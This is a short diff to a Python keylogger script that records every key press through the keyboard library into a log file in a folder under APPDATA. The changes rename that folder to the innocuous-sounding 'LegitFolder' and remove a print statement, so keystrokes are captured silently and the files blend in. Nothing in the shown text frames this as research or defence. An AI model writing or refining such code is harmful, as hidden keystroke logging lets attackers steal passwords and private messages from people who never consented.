@@ -3,7 +3,7 @@
 import keyboard
 import os
 
-directory = os.path.join(os.getenv("APPDATA"), "Legitness")
+directory = os.path.join(os.getenv("APPDATA"), "LegitFolder")
 
 # Make the specified directory. If it doesn't exist, 
 try:
@@ -22,5 +22,4 @@ with open(log_path, "w") as f:
     for event in events:
         if event.event_type == keyboard.KEY_DOWN:
             key = event.name
-            print(key)
             f.write(f"{key}")
